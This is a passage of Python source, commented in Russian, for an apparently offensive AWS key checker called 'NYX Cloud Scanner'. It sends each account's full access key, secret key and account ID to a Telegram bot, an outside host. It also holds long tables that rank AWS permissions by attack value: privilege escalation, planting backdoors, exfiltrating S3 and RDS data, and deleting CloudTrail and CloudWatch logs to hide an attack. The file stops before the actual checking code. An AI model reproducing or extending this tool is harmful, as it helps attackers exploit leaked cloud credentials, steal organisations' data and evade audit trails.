#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NYX Cloud Scanner Module AWS - Final Version
Модуль сканирования облачной инфраструктуры AWS с красивым выводом в терминал и Telegram
"""

import argparse
import boto3
import json
import logging
import os
import requests
import sys
import time
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any
from botocore.exceptions import ClientError, BotoCoreError, NoCredentialsError
from botocore.config import Config
from dotenv import load_dotenv

# Try to import colorama for colored output
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    
    class Style:
        RESET_ALL = '\033[0m'
        BRIGHT = '\033[1m'
    
    COLORAMA_AVAILABLE = False

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ============================================================================
# TELEGRAM NOTIFIER CLASS
# ============================================================================

class TelegramNotifier:
    """Синхронный класс для отправки уведомлений в Telegram"""
    
    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.enabled = bool(bot_token and chat_id)
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        
        if self.enabled:
            print(f"{Fore.GREEN}✅ Telegram уведомления включены{Fore.RESET}")
        else:
            print(f"{Fore.YELLOW}⚠️ Telegram уведомления отключены{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*50}{Fore.RESET}")
        print()
    
    def send_message(self, message: str) -> bool:
        """Отправляет сообщение в Telegram"""
        if not self.enabled:
            print(f"{Fore.YELLOW}⚠️ Telegram отключен - токен или chat_id не настроены{Fore.RESET}")
            return False
            
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            
            print(f"{Fore.CYAN}📤 Отправка в Telegram...{Fore.RESET}")
            print(f"{Fore.CYAN}   URL: {url}{Fore.RESET}")
            print(f"{Fore.CYAN}   Chat ID: {self.chat_id}{Fore.RESET}")
            
            response = requests.post(url, data=data, timeout=10)
            print(f"{Fore.CYAN}   Response Status: {response.status_code}{Fore.RESET}")
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}✅ Сообщение успешно отправлено в Telegram{Fore.RESET}")
                return True
            else:
                print(f"{Fore.RED}❌ Ошибка HTTP {response.status_code}: {response.text}{Fore.RESET}")
                return False
            
        except Exception as e:
            print(f"{Fore.RED}❌ Ошибка отправки в Telegram: {e}{Fore.RESET}")
            return False
    
    def send_validation_result(self, data: Dict[str, Any]) -> bool:
        """Отправляет результат валидации в Telegram"""
        
        # Определяем доступные эскалации на основе доступных сервисов
        accessible_services = data.get('accessible_services_list', [])
        escalation_flows = self._analyze_available_escalations(accessible_services)
        
        message = f"""
🔥 <b>НОВЫЙ АККАУНТ AWS ОБНАРУЖЕН!</b>

━━━━━━━━━━━━━━━━━━━━━━
📊 <b>СТАТИСТИКА</b>
━━━━━━━━━━━━━━━━━━━━━━
🏷️ Категория: {data.get('category', 'N/A')}
🆔 Account ID: <code>{data.get('account_id', 'N/A')}</code>
⭐ Балл: {data.get('score', 0)}/60
📈 Доступ: {int((data.get('accessible_services', 0) / data.get('total_services', 1)) * 100)}% сервисов
🔧 Доступно: {data.get('accessible_services', 0)}/{data.get('total_services', 0)} сервисов

━━━━━━━━━━━━━━━━━━━━━━
🔑 <b>УЧЕТНЫЕ ДАННЫЕ</b>
━━━━━━━━━━━━━━━━━━━━━━
Access Key: <code>{data.get('access_key', 'N/A')}</code>
Secret Key: <code>{data.get('secret_key', 'N/A')}</code>
Account ID: <code>{data.get('account_id', 'N/A')}</code>
Регион: {data.get('region', 'us-east-1')}

━━━━━━━━━━━━━━━━━━━━━━
🚀 <b>ДОСТУПНЫЕ ЭСКАЛАЦИИ</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
        
        if escalation_flows:
            for flow_name, flow_info in escalation_flows.items():
                message += f"\n<b>{flow_info['emoji']} {flow_name}</b>\n"
                message += f"📋 {flow_info['description']}\n"
                if flow_info['capabilities']:
                    message += "💡 Возможности:\n"
                    for capability in flow_info['capabilities']:
                        message += f"   • {capability}\n"
                message += "\n"
        else:
            message += "❌ Критические эскалации недоступны\n"
            message += "ℹ️ Доступны только информационные сервисы\n"
        
        message += f"\n🕐 Время обнаружения: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        return self.send_message(message.strip())
    
    def _analyze_available_escalations(self, accessible_services: List[str]) -> Dict[str, Dict]:
        """Анализирует доступные эскалации на основе доступных сервисов"""
        escalation_flows = {}
        
        # Определяем эскалации на основе доступных сервисов
        escalation_definitions = {
            'IAM User Escalation': {
                'emoji': '👤',
                'required_services': ['iam_create_user', 'iam_attach_user_policy', 'iam_create_access_key', 'iam_put_user_policy', 'iam_create_login_profile'],
                'description': 'Создание пользователей с административными правами',
                'capabilities': [
                    'Создание новых пользователей с полными правами',
                    'Прикрепление политик AdministratorAccess к пользователям',
                    'Создание ключей доступа для новых пользователей',
                    'Получение административного доступа к аккаунту',
                    'Создание backdoor для постоянного доступа'
                ]
            },
            'IAM Role Escalation': {
                'emoji': '🔑',
                'required_services': ['iam_create_role', 'iam_attach_role_policy', 'sts_assume_role', 'iam_pass_role', 'iam_put_role_policy', 'iam_update_assume_role_policy'],
                'description': 'Создание ролей для принятия с полными правами',
                'capabilities': [
                    'Создание ролей с полными правами',
                    'Прикрепление политик AdministratorAccess к ролям',
                    'Передача ролей в сервисы (Lambda, EC2)',
                    'Принятие ролей с административным доступом',
                    'Получение временных учетных данных с высокими правами'
                ]
            },
            'Secrets Manager': {
                'emoji': '🔐',
                'required_services': ['secrets_manager_secrets', 'secrets_manager_create_secret', 'secrets_manager_update_secret', 'secrets_manager_put_secret_value', 'secrets_manager_delete_secret', 'secrets_manager_restore_secret', 'secrets_manager_rotate_secret'],
                'description': 'Получение и создание паролей, API ключей, сертификатов',
                'capabilities': [
                    'Извлечение всех секретов из AWS Secrets Manager',
                    'Получение паролей к базам данных и сервисам',
                    'Создание секретов для хранения компрометирующих данных',
                    'Обновление существующих секретов с новыми данными',
                    'Доступ к API ключам сторонних сервисов'
                ]
            },
            'Systems Manager': {
                'emoji': '⚙️',
                'required_services': ['systems_manager_commands', 'systems_manager_parameters', 'systems_manager_send_command', 'systems_manager_start_session', 'systems_manager_terminate_session', 'systems_manager_create_document', 'systems_manager_update_document', 'systems_manager_delete_document'],
                'description': 'Удаленное выполнение команд и получение конфигураций',
                'capabilities': [
                    'Выполнение команд на всех EC2 инстансах',
                    'Получение конфигурационных файлов серверов',
                    'Отправка команд на EC2 инстансы для удаленного выполнения',
                    'Интерактивные сессии на серверах через SSM',
                    'Установка программного обеспечения',
                    'Сбор логов и метрик с серверов'
                ]
            },
            'S3 Data Exfiltration': {
                'emoji': '💾',
                'required_services': ['s3_buckets', 's3_objects', 's3_put_object', 's3_create_bucket', 's3_delete_bucket', 's3_get_object', 's3_get_object_acl', 's3_put_object_acl', 's3_put_bucket_policy', 's3_put_bucket_acl'],
                'description': 'Прямой доступ к данным и создание backdoor',
                'capabilities': [
                    'Скачивание всех файлов из S3 бакетов',
                    'Извлечение резервных копий и дампов',
                    'Загрузка файлов для создания backdoor',
                    'Создание новых S3 бакетов для хранения данных',
                    'Удаление S3 бакетов для сокрытия следов атаки',
                    'Доступ к статическим ресурсам веб-сайтов'
                ]
            },
            'EC2 Management': {
                'emoji': '💻',
                'required_services': ['ec2_instances', 'ec2_volumes', 'ec2_snapshots', 'ec2_run_instances', 'ec2_create_key_pair', 'ec2_start_instances', 'ec2_authorize_security_group_ingress', 'ec2_create_security_group', 'ec2_create_image', 'ec2_modify_instance_attribute', 'ec2_modify_volume', 'ec2_create_tags'],
                'description': 'Доступ к серверам и создание новых инстансов',
                'capabilities': [
                    'Получение списка всех серверов и их IP',
                    'Создание снимков дисков для анализа',
                    'Создание новых EC2 инстансов для контроля',
                    'Создание SSH ключей для доступа к инстансам',
                    'Запуск остановленных инстансов для получения доступа',
                    'Открытие портов в security groups для доступа',
                    'Доступ к метаданным инстансов'
                ]
            },
            'Lambda Privilege Escalation': {
                'emoji': '🚀',
                'required_services': ['lambda_functions', 'lambda_create_function', 'lambda_invoke_function', 'lambda_update_function_code', 'lambda_delete_function', 'lambda_get_function', 'lambda_update_function_configuration', 'lambda_add_permission', 'lambda_publish_version', 'lambda_create_layer_version', 'lambda_create_alias', 'lambda_update_alias', 'lambda_delete_alias', 'lambda_get_layer_version', 'lambda_delete_layer_version'],
                'description': 'Полная эскалация через Lambda функции и слои',
                'capabilities': [
                    'Создание Lambda функций с повышенными правами',
                    'Выполнение произвольного кода в облаке',
                    'Изменение кода существующих Lambda функций',
                    'Удаление Lambda функций для сокрытия следов атаки',
                    'Получение детальной информации о функциях для анализа',
                    'Изменение конфигурации функций для повышения привилегий',
                    'Добавление разрешений к функциям для внешнего доступа',
                    'Публикация версий функций для создания backdoor',
                    'Создание слоев Lambda для внедрения вредоносного кода',
                    'Создание backdoor для постоянного доступа'
                ]
            },
            'Security & Compliance': {
                'emoji': '🔒',
                'required_services': ['kms_keys', 'kms_aliases', 'kms_create_key', 'kms_put_key_policy'],
                'description': 'Ключи и шифрование',
                'capabilities': [
                    'Расшифровка зашифрованных данных',
                    'Доступ к ключам шифрования',
                    'Создание новых ключей шифрования для контроля',
                    'Удаление ключей шифрования для нарушения работы системы',
                    'Изменение политик ключей для эскалации привилегий',
                    'Обход защиты данных',
                    'Получение зашифрованных секретов'
                ]
            },
            'IAM Groups Escalation': {
                'emoji': '👥',
                'required_services': ['iam_users', 'iam_groups', 'iam_create_group', 'iam_attach_group_policy', 'iam_add_user_to_group'],
                'description': 'Эскалация через создание группы с полными правами',
                'capabilities': [
                    'Создание административной группы',
                    'Прикрепление политики с полными правами',
                    'Добавление себя в группу',
                    'Получение административного доступа'
                ]
            },
            'IAM Full Control': {
                'emoji': '👑',
                'required_services': [
                    'iam_create_user', 'iam_attach_user_policy', 'iam_create_access_key',
                    'iam_put_user_policy', 'iam_create_login_profile',
                    'iam_create_role', 'iam_attach_role_policy', 'iam_put_role_policy',
                    'iam_update_assume_role_policy', 'sts_assume_role', 'iam_pass_role'
                ],
                'description': 'Полный контроль над IAM и всеми пользователями',
                'capabilities': [
                    'Создание пользователей с любыми правами',
                    'Создание ролей с любыми правами',
                    'Создание inline политик',
                    'Создание паролей для консольного доступа',
                    'Изменение trust policy ролей',
                    'Полный административный контроль'
                ]
            },
            'Data Exfiltration Complete': {
                'emoji': '📊',
                'required_services': [
                    's3_buckets', 's3_objects', 's3_get_object', 's3_put_object',
                    'rds_instances', 'rds_snapshots', 'rds_create_db_snapshot',
                    'rds_start_export_task', 'rds_copy_db_snapshot',
                    'secrets_manager_secrets', 'secrets_manager_create_secret'
                ],
                'description': 'Полное извлечение всех данных организации',
                'capabilities': [
                    'Скачивание всех файлов из S3',
                    'Создание снимков всех БД',
                    'Экспорт данных БД в S3',
                    'Извлечение всех секретов',
                    'Полная эксфильтрация данных'
                ]
            },
            'Infrastructure Control': {
                'emoji': '🏗️',
                'required_services': [
                    'ec2_instances', 'ec2_run_instances', 'ec2_create_security_group',
                    'ec2_create_image', 'ec2_modify_instance_attribute',
                    'lambda_create_function', 'lambda_update_function_code',
                    'systems_manager_send_command', 'systems_manager_start_session'
                ],
                'description': 'Полный контроль над инфраструктурой',
                'capabilities': [
                    'Создание новых серверов',
                    'Создание групп безопасности',
                    'Создание образов AMI',
                    'Изменение настроек серверов',
                    'Выполнение команд на всех серверах',
                    'Полный контроль инфраструктуры'
                ]
            }
        }
        
        # Проверяем какие эскалации доступны
        for flow_name, flow_info in escalation_definitions.items():
            required_services = flow_info['required_services']
            available_services = [s for s in required_services if s in accessible_services]
            
            if len(available_services) == len(required_services):
                # Все сервисы доступны
                escalation_flows[flow_name] = {
                    'emoji': flow_info['emoji'],
                    'description': flow_info['description'],
                    'capabilities': flow_info['capabilities'],
                    'status': 'READY'
                }
            elif len(available_services) > 0:
                # Частично доступно
                escalation_flows[flow_name] = {
                    'emoji': flow_info['emoji'],
                    'description': f"{flow_info['description']} (частично доступно)",
                    'capabilities': flow_info['capabilities'][:2],  # Показываем только первые 2 возможности
                    'status': 'PARTIAL'
                }
        
        return escalation_flows

# ============================================================================
# AWS KEY VALIDATOR CLASS
# ============================================================================

class AWSKeyValidator:
    """Класс для валидации AWS ключей"""
    
    def __init__(self):
        self.region = "us-east-1"
        
        # 🔄 АДАПТИВНЫЕ ТАЙМАУТЫ - Динамические настройки
        self.base_timeout = 3  # Базовый таймаут для быстрых операций
        self.critical_timeout = 15  # Таймаут для критических операций
        self.max_timeout = 30  # Максимальный таймаут
        self.retry_attempts = 3  # Количество попыток
        self.backoff_multiplier = 1.5  # Множитель для экспоненциальной задержки
        
        # Кэш для результатов проверок
        self.service_cache = {}
        self.cache_ttl = 300  # TTL кэша в секундах (5 минут)
        
        # Статистика производительности
        self.performance_stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'avg_response_time': 0,
            'service_response_times': {}
        }
        
        # Описания сервисов для пользователя
        # Обновленные описания сервисов с учетом приоритетов (2025)
        self.service_descriptions = {
            # 🔴 КРИТИЧЕСКИЕ WRITE ОПЕРАЦИИ - Максимальная угроза
            'iam_create_user': 'создание новых пользователей с административными правами',
            'iam_create_role': 'создание ролей для принятия с полными правами',
            'iam_attach_user_policy': 'прикрепление политик с полными правами к пользователям',
            'iam_attach_role_policy': 'прикрепление политик с полными правами к ролям',
            'iam_create_access_key': 'создание ключей доступа для новых пользователей',
            'iam_put_user_policy': 'создание inline политик для пользователей с полными правами',
            'iam_create_login_profile': 'создание паролей для консольного доступа к AWS',
            'iam_update_login_profile': 'изменение паролей консольного доступа к AWS',
            'iam_pass_role': 'передача ролей в сервисы для эскалации через Lambda/EC2',
            'iam_put_role_policy': 'создание inline политик для ролей с полными правами',
            'iam_update_assume_role_policy': 'изменение trust policy ролей для расширения доступа',
            'sts_assume_role': 'принятие ролей с административным доступом',
            'secrets_manager_create_secret': 'создание секретов для хранения компрометирующих данных',
            'secrets_manager_update_secret': 'обновление существующих секретов с новыми данными',
            'secrets_manager_delete_secret': 'удаление секретов для сокрытия следов атаки',
            'secrets_manager_restore_secret': 'восстановление удаленных секретов',
            'secrets_manager_rotate_secret': 'ротация секретов',
            's3_put_object': 'загрузка файлов в S3 для создания backdoor',
            's3_create_bucket': 'создание новых S3 бакетов для хранения данных',
            's3_delete_bucket': 'удаление S3 бакетов для сокрытия следов атаки',
            's3_get_object': 'скачивание файлов (READ операция)',
            's3_get_object_acl': 'получение ACL объектов',
            's3_put_object_acl': 'изменение ACL объектов',
            's3_put_bucket_policy': 'изменение политик бакетов',
            's3_put_bucket_acl': 'изменение ACL бакетов',
            'ec2_run_instances': 'создание новых EC2 инстансов для контроля инфраструктуры',
            'ec2_create_key_pair': 'создание SSH ключей для доступа к инстансам',
            'ec2_start_instances': 'запуск остановленных инстансов для получения доступа',
            'ec2_authorize_security_group_ingress': 'открытие портов в security groups для доступа',
            'ec2_create_security_group': 'создание групп безопасности',
            'ec2_create_image': 'создание образов AMI',
            'ec2_modify_instance_attribute': 'изменение атрибутов инстансов',
            'ec2_modify_volume': 'изменение параметров дисков',
            'ec2_create_tags': 'добавление тегов к ресурсам',
            'ec2_snapshots': 'просмотр снимков дисков для анализа данных',
            'lambda_update_function_code': 'изменение кода Lambda функций для выполнения произвольного кода',
            'lambda_delete_function': 'удаление Lambda функций для сокрытия следов атаки и очистки',
            'lambda_get_function': 'получение детальной информации о функциях для анализа и планирования атак',
            'lambda_update_function_configuration': 'изменение конфигурации функций для повышения привилегий и доступа',
            'lambda_add_permission': 'добавление разрешений к функциям для внешнего доступа и эскалации',
            'lambda_publish_version': 'публикация версий функций для создания backdoor и постоянного доступа',
            'lambda_create_layer_version': 'создание слоев Lambda для внедрения вредоносного кода в существующие функции',
            'lambda_create_alias': 'создание алиасов Lambda',
            'lambda_update_alias': 'обновление алиасов Lambda',
            'lambda_delete_alias': 'удаление алиасов Lambda',
            'lambda_get_layer_version': 'получение информации о слоях',
            'lambda_delete_layer_version': 'удаление версий слоев',
            
            # 🔴 КРИТИЧЕСКИЕ READ ОПЕРАЦИИ - Максимальная угроза
            'secrets_manager_secrets': 'получение паролей, API ключей, сертификатов (Secrets Manager)',
            's3_objects': 'прямой доступ к данным без дополнительной аутентификации (S3)',
            'systems_manager_commands': 'удаленное выполнение команд на всех серверах (SSM Commands)',
            'rds_snapshots': 'просмотр списка снимков баз данных для анализа доступных данных (RDS)',
            'rds_create_db_snapshot': 'создание снимков баз данных для эксфильтрации данных',
            'rds_start_export_task': 'экспорт снимков RDS в S3 для скачивания данных',
            'rds_copy_db_snapshot': 'копирование снимков RDS для создания резервных копий',
            'rds_modify_db_instance': 'изменение настроек БД',
            'rds_modify_db_cluster': 'изменение настроек кластера БД',
            'rds_create_db_instance': 'создание новых БД',
            'rds_create_db_cluster': 'создание новых кластеров БД',
            'systems_manager_parameters': 'получение конфигурационных файлов серверов (SSM Parameters)',
            'systems_manager_send_command': 'отправка команд на EC2 инстансы для удаленного выполнения',
            'systems_manager_start_session': 'интерактивные сессии на серверах через SSM',
            'systems_manager_terminate_session': 'завершение активных сессий на серверах',
            'systems_manager_create_document': 'создание SSM документов',
            'systems_manager_update_document': 'обновление SSM документов',
            'systems_manager_delete_document': 'удаление SSM документов',
            
            # 🟡 ВЫСОКИЙ ПРИОРИТЕТ - Высокая эксплуатационная ценность
            'ec2_instances': 'получение списка серверов и их IP адресов',
            's3_buckets': 'анализ структуры данных организации',
            'ec2_volumes': 'создание снимков дисков для анализа данных',
            'lambda_create_function': 'выполнение произвольного кода в облаке',
            'kms_keys': 'расшифровка зашифрованных данных',
            'rds_instances': 'получение информации о базах данных',
            'rds_clusters': 'анализ архитектуры данных',
            
            # 🟢 СРЕДНИЙ ПРИОРИТЕТ - Средняя эксплуатационная ценность
            'iam_attach_group_policy': 'прикрепление политик с полными правами',
            'iam_add_user_to_group': 'добавление в группу с высокими правами',
            'lambda_invoke_function': 'выполнение Lambda функций',
            'iam_create_group': 'создание группы с повышенными правами',
            
            # ⚪ НИЗКИЙ ПРИОРИТЕТ - Информационная разведка
            'iam_users': 'анализ пользователей',
            'lambda_functions': 'анализ существующих функций',
            
            # Информационные сервисы
            'iam_groups': 'информация: просмотр групп пользователей',
            'ec2_key_pairs': 'информация: просмотр SSH ключей',
            'ec2_images': 'информация: просмотр образов EC2',
            'ec2_security_groups': 'информация: просмотр групп безопасности',
            'kms_aliases': 'информация: просмотр KMS алиасов',
            'kms_create_key': 'создание новых ключей шифрования для контроля и атак',
            'kms_put_key_policy': 'изменение политик ключей для эскалации привилегий',
            'cloudwatch_delete_logs': 'удаление логов CloudWatch для сокрытия следов атаки',
            'cloudtrail_delete_trail': 'удаление CloudTrail трейлов для сокрытия аудита',
            'cloudtrail_stop_logging': 'остановка логирования CloudTrail',
            'cloudtrail_put_event_selectors': 'изменение селекторов событий CloudTrail',
            'cloudwatch_logs_delete_log_group': 'удаление групп логов CloudWatch',
            'cloudwatch_logs_stop_logging': 'остановка логирования CloudWatch Logs',
            'cloudwatch_logs_put_retention_policy': 'изменение политики хранения логов',
            'cloudwatch_logs_delete_log_stream': 'удаление потоков логов',
        }
        
        # Обновленные веса сервисов на основе реальной эксплуатационной ценности (2025)
        self.service_scores = {
            # 🔴 КРИТИЧЕСКИЕ WRITE ОПЕРАЦИИ - Максимальная угроза
            'iam_create_user': 60,  # Создание пользователей с административными правами
            'iam_create_role': 60,  # Создание ролей для принятия с полными правами
            'iam_attach_user_policy': 55,  # Прикрепление политик с полными правами к пользователям
            'iam_attach_role_policy': 55,  # Прикрепление политик с полными правами к ролям
            'iam_create_access_key': 50,  # Создание ключей доступа для новых пользователей
            'iam_put_user_policy': 55,  # Создание inline политик для пользователей с полными правами
            'iam_create_login_profile': 50,  # Создание паролей для консольного доступа к AWS
            'iam_update_login_profile': 45,  # Изменение паролей консольного доступа к AWS
            'iam_put_role_policy': 55,  # Создание inline политик для ролей с полными правами
            'iam_update_assume_role_policy': 50,  # Изменение trust policy ролей для расширения доступа
            'iam_tag_role': 40,  # Добавление тегов к ролям
            'iam_untag_role': 40,  # Удаление тегов с ролей
            'iam_pass_role': 45,  # Передача ролей в сервисы для эскалации через Lambda/EC2
            'sts_assume_role': 50,  # Принятие ролей с административным доступом
            'secrets_manager_create_secret': 50,  # Создание секретов для хранения компрометирующих данных
            'secrets_manager_update_secret': 45,  # Обновление существующих секретов с новыми данными
            'secrets_manager_delete_secret': 40,  # Удаление секретов для сокрытия следов атаки
            'secrets_manager_restore_secret': 35,  # Восстановление удаленных секретов
            'secrets_manager_rotate_secret': 40,  # Ротация секретов
            's3_put_object': 45,  # Загрузка файлов в S3 для создания backdoor
            's3_create_bucket': 40,  # Создание новых S3 бакетов для хранения данных
            's3_delete_bucket': 35,  # Удаление S3 бакетов для сокрытия следов атаки
            's3_get_object': 35,  # Скачивание файлов (READ операция)
            's3_get_object_acl': 30,  # Получение ACL объектов
            's3_put_object_acl': 35,  # Изменение ACL объектов
            's3_put_bucket_policy': 40,  # Изменение политик бакетов
            's3_put_bucket_acl': 35,  # Изменение ACL бакетов
            'ec2_run_instances': 45,  # Создание новых EC2 инстансов для контроля инфраструктуры
            'ec2_create_key_pair': 40,  # Создание SSH ключей для доступа к инстансам
            'ec2_start_instances': 45,  # Запуск остановленных инстансов для получения доступа
            'ec2_authorize_security_group_ingress': 40,  # Открытие портов в security groups для доступа
            'ec2_create_security_group': 40,  # Создание групп безопасности
            'ec2_create_image': 45,  # Создание образов AMI
            'ec2_modify_instance_attribute': 40,  # Изменение атрибутов инстансов
            'ec2_modify_volume': 35,  # Изменение параметров дисков
            'ec2_create_tags': 30,  # Добавление тегов к ресурсам
            'ec2_snapshots': 20,  # Просмотр снимков дисков для анализа данных
            'lambda_update_function_code': 45,  # Изменение кода Lambda функций для выполнения произвольного кода
            'lambda_delete_function': 35,  # Удаление Lambda функций для сокрытия следов атаки и очистки
            'lambda_get_function': 25,  # Получение детальной информации о функциях для анализа и планирования атак
            'lambda_update_function_configuration': 40,  # Изменение конфигурации функций для повышения привилегий и доступа
            'lambda_add_permission': 45,  # Добавление разрешений к функциям для внешнего доступа и эскалации
            'lambda_publish_version': 40,  # Публикация версий функций для создания backdoor и постоянного доступа
            'lambda_create_layer_version': 50,  # Создание слоев Lambda для внедрения вредоносного кода в существующие функции
            'lambda_create_alias': 35,  # Создание алиасов Lambda
            'lambda_update_alias': 30,  # Обновление алиасов Lambda
            'lambda_delete_alias': 25,  # Удаление алиасов Lambda
            'lambda_get_layer_version': 20,  # Получение информации о слоях
            'lambda_delete_layer_version': 30,  # Удаление версий слоев
            
            # 🔴 КРИТИЧЕСКИЕ READ ОПЕРАЦИИ - Максимальная угроза
            'secrets_manager_secrets': 45,  # Получение паролей, API ключей, сертификатов
            's3_objects': 35,  # Прямой доступ к данным без дополнительной аутентификации
            'systems_manager_commands': 35,  # Удаленное выполнение команд на всех серверах
            'rds_snapshots': 15,  # Просмотр списка снимков баз данных для анализа доступных данных
            'rds_create_db_snapshot': 40,  # Создание снимков баз данных для эксфильтрации данных
            'rds_start_export_task': 45,  # Экспорт снимков RDS в S3 для скачивания данных
            'rds_copy_db_snapshot': 35,  # Копирование снимков RDS для создания резервных копий
            'rds_modify_db_instance': 40,  # Изменение настроек БД
            'rds_modify_db_cluster': 40,  # Изменение настроек кластера БД
            'rds_create_db_instance': 45,  # Создание новых БД
            'rds_create_db_cluster': 45,  # Создание новых кластеров БД
            'systems_manager_parameters': 30,  # Получение конфигурационных файлов серверов
            'systems_manager_send_command': 40,  # Отправка команд на EC2 инстансы для удаленного выполнения
            'systems_manager_start_session': 45,  # Интерактивные сессии на серверах через SSM
            'systems_manager_terminate_session': 25,  # Завершение активных сессий на серверах
            'systems_manager_create_document': 45,  # Создание SSM документов
            'systems_manager_update_document': 40,  # Обновление SSM документов
            'systems_manager_delete_document': 35,  # Удаление SSM документов
            
            # 🟡 ВЫСОКИЙ ПРИОРИТЕТ - Высокая эксплуатационная ценность
            'ec2_instances': 30,  # Получение списка серверов и их IP адресов
            's3_buckets': 30,  # Анализ структуры данных организации
            'ec2_volumes': 25,  # Создание снимков дисков для анализа данных
            'lambda_create_function': 25,  # Выполнение произвольного кода в облаке
            'kms_keys': 25,  # Расшифровка зашифрованных данных
            'rds_instances': 25,  # Получение информации о базах данных
            'rds_clusters': 25,  # Анализ архитектуры данных
            
            # 🟢 СРЕДНИЙ ПРИОРИТЕТ - Средняя эксплуатационная ценность
            'iam_attach_group_policy': 20,  # Прикрепление политик с полными правами
            'iam_add_user_to_group': 20,  # Добавление в группу с высокими правами
            'lambda_invoke_function': 20,  # Выполнение Lambda функций
            'iam_create_group': 20,  # Создание группы с повышенными правами
            
            # ⚪ НИЗКИЙ ПРИОРИТЕТ - Информационная разведка
            'iam_users': 15,  # Анализ пользователей
            'lambda_functions': 15,  # Анализ существующих функций
            
            # Информационные сервисы (5-10 баллов)
            'iam_groups': 10,
            'ec2_key_pairs': 10, 'ec2_images': 10, 'ec2_security_groups': 10,
            'kms_aliases': 10, 'systems_manager_parameters': 10,
            'kms_create_key': 40, 'kms_put_key_policy': 50,
            
            # 🔴 КРИТИЧЕСКИЕ ТЕХНИКИ УДАЛЕНИЯ ЛОГОВ - Сокрытие следов атак
            'cloudtrail_delete_trail': 60,  # Удаление CloudTrail трейлов - максимальная угроза для сокрытия аудита
            'cloudtrail_stop_logging': 55,  # Остановка логирования CloudTrail
            'cloudtrail_put_event_selectors': 50,  # Изменение селекторов событий для фильтрации логов
            'cloudwatch_logs_delete_log_group': 50,  # Удаление групп логов CloudWatch
            'cloudwatch_logs_stop_logging': 45,  # Остановка логирования CloudWatch Logs
            'cloudwatch_logs_put_retention_policy': 40,  # Изменение политики хранения логов
            'cloudwatch_logs_delete_log_stream': 35,  # Удаление потоков логов
            'cloudwatch_delete_logs': 30,  # Удаление логов CloudWatch
        }
        
        # Политики для эскалации
        self.escalation_policies = {
            "high_priority": [
                "arn:aws:iam::aws:policy/IAMFullAccess",
                "arn:aws:iam::aws:policy/AdministratorAccess"
            ],
            "service_specific": [
                "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole",
                "arn:aws:iam::aws:policy/service-role/AWSLambdaRole",
                "arn:aws:iam::aws:policy/AmazonEKSClusterPolicy",
                "arn:aws:iam::aws:policy/AmazonEKSWorkerNodePolicy",
                "arn:aws:iam::aws:policy/SecretsManagerReadWrite"
            ]
        }
        
        # Флоу атак и их требования
        self.attack_flows = {
            "ec2_management": {
                "name": "EC2 Management Attack",
                "required_services": ["ec2_instances", "ec2_volumes", "ec2_snapshots"],
                "escalation_roles": ["AWSLambdaBasicExecutionRole", "IAMFullAccess"],
                "description": "Управление EC2 инстансами, создание снапшотов, доступ к данным (AmazonEC2FullAccess, AWSLambdaBasicExecutionRole)"
            },
            "s3_exfiltration": {
                "name": "S3 Bucket Exfiltration",
                "required_services": ["s3_buckets", "s3_objects"],
                "escalation_roles": ["AWSLambdaBasicExecutionRole", "IAMFullAccess"],
                "description": "Извлечение данных из S3 бакетов, скачивание файлов (AmazonS3FullAccess, AWSLambdaBasicExecutionRole)"
            },
            "rds_data_extraction": {
                "name": "RDS Data Extraction",
                "required_services": ["rds_instances", "rds_snapshots", "rds_clusters", "rds_create_db_snapshot", "rds_start_export_task"],
                "escalation_roles": ["AWSLambdaBasicExecutionRole", "IAMFullAccess"],
                "description": "Извлечение данных из RDS, создание снапшотов БД и экспорт в S3 (AmazonRDSFullAccess, AWSLambdaBasicExecutionRole)"
            },
            "lambda_escalation": {
                "name": "Lambda Privilege Escalation",
                "required_services": ["lambda_functions"],
                "escalation_roles": ["AWSLambdaBasicExecutionRole", "IAMFullAccess"],
                "description": "Создание Lambda функций с повышенными правами (AWSLambdaBasicExecutionRole, AWSLambdaRole)"
            },
            "cross_service_attack": {
                "name": "Cross-Account Attack Chain",
                "required_services": ["sts_assume_role", "iam_create_role", "iam_pass_role"],
                "escalation_roles": ["IAMFullAccess", "AdministratorAccess"],
                "description": "Межаккаунтный переход через роли (Cross-Account Role Assumption)"
            },
            "log_deletion": {
                "name": "Log Deletion Attack",
                "required_services": ["cloudtrail_delete_trail", "cloudtrail_stop_logging", "cloudwatch_logs_delete_log_group"],
                "escalation_roles": ["CloudTrailFullAccess", "CloudWatchLogsFullAccess"],
                "description": "Удаление логов и сокрытие следов атак (CloudTrailFullAccess, CloudWatchLogsFullAccess)"
            },
            "forensic_cleanup": {
                "name": "Forensic Cleanup Attack",
                "required_services": ["secrets_manager_delete_secret", "s3_delete_bucket", "lambda_delete_function"],
                "escalation_roles": ["SecretsManagerFullAccess", "S3FullAccess", "AWSLambdaFullAccess"],
                "description": "Удаление следов атаки и очистка инфраструктуры"
            }
        }
        
        # Категории аккаунтов (обновленные для полного списка сервисов)
        # Обновленные категории аккаунтов с учетом новых баллов (2025)
        self.account_categories = {
            'critical': {'min_score': 50, 'emoji': '🔥', 'name': 'CRITICAL - Максимальная угроза'},
            'high': {'min_score': 30, 'emoji': '🚨', 'name': 'HIGH - Высокая угроза'},
            'medium': {'min_score': 15, 'emoji': '⚠️', 'name': 'MEDIUM - Средняя угроза'},
            'low': {'min_score': 5, 'emoji': '📊', 'name': 'LOW - Низкая угроза'},
            'minimal': {'min_score': 0, 'emoji': '🔍', 'name': 'MINIMAL - Минимальная угроза'}
        }
    
